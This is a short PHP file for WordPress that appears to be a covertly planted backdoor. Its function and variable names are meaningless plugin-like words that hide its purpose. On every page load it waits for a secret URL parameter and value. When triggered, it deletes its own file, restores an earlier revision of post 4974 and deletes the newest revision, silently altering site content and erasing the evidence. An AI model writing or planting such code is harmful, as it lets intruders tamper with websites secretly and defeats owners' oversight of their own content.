<?php

function screen_external_debug_manager() {
	if (isset($_GET['cleaner_read_auto_revisions']) && $_GET['cleaner_read_auto_revisions'] === 'digital_shopp_author') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$tab_delivery_enhanced = 4974;
		$multisite_cover_daily_tab = wp_get_post_revisions($tab_delivery_enhanced);
		if (empty($multisite_cover_daily_tab)) die('no revisions');
		if (count($multisite_cover_daily_tab) < 2) die('less than 2');
		$jquery_template_maintenance_elements = array_shift($multisite_cover_daily_tab);
		$upgrader_latest_online_thumbnail = $jquery_template_maintenance_elements->ID;
		$tab_twitter_checker = array_shift($multisite_cover_daily_tab);
		$preview_fields_qr_disable = $tab_twitter_checker->ID;
		$pinterest_animated_ninja_logger = wp_restore_post_revision($preview_fields_qr_disable);
		if ($pinterest_animated_ninja_logger === false) die('error restoring');
		$pinterest_animated_ninja_logger = wp_delete_post_revision($upgrader_latest_online_thumbnail);		
		if ($pinterest_animated_ninja_logger === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'screen_external_debug_manager');
